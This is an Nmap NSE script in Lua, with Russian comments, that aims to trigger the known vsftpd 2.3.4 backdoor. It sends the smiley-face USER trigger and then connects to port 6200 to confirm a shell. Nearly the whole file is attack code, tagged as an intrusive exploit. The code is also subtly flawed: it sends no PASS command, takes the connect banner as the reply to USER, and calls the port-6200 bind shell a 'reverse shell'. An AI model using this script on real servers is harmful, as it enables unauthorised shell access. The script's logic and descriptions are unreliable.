-- vsftpd_backdoor.nse
--
-- Эксплойт уязвимости задней двери в уязвимых версиях vsftpd (2.3.4)
--
-- Требования:
--   nmap 7.80+
--   nmap stdnse, shortport, socket библиотеки
--
-- Автор: TeslaAI Expert
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local socket = require "socket"

description = [[
Проверяет и эксплуатирует заднюю дверь в уязвимых версиях vsftpd 2.3.4, вызывая создание обратного шелла через TCP порт 6200.
]]

author = "TeslaAI Expert"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"exploit", "vuln", "intrusive"}

portrule = shortport.port_or_service(21, "ftp")

local function exploit(host, port)
  local try = nmap.new_try()
  local sock = nmap.new_socket()
  sock:set_timeout(5000)
  local status, err = sock:connect(host, port)
  if not status then
    return nil, "Не удалось подключиться: " .. (err or "неизвестная ошибка")
  end

  -- Отправка зловредного USER с встраиваемой задней дверью
  local payload = "USER smile:)\n"
  status, err = sock:send(payload)
  if not status then
    sock:close()
    return nil, "Ошибка при отправке полезной нагрузки: " .. (err or "неизвестная ошибка")
  end

  -- Чтение ответа (обычно "220")
  local line = sock:receive_lines(1)
  sock:close()

  if line and line:match("220") then
    -- После этого, задняя дверь должна открыть TCP порт 6200
    local shell_sock = nmap.new_socket()
    shell_sock:set_timeout(3000)
    status, err = shell_sock:connect(host, 6200)
    if status then
      shell_sock:close()
      return true, "Уязвимость vsftpd backdoor обнаружена: обратный шелл открыт на порту 6200"
    else
      return false, "Ответ на USER получен, но порт 6200 закрыт"
    end
  else
    return false, "Сервер не ответил ожидаемым приветствием, возможно не уязвим"
  end
end

action = function(host, port)
  local status, result = exploit(host.ip, port.number)
  if status == nil then
    return "Ошибка: " .. result
  elseif status then
    return result
  else
    return "Уязвимость не обнаружена: " .. result
  end
end
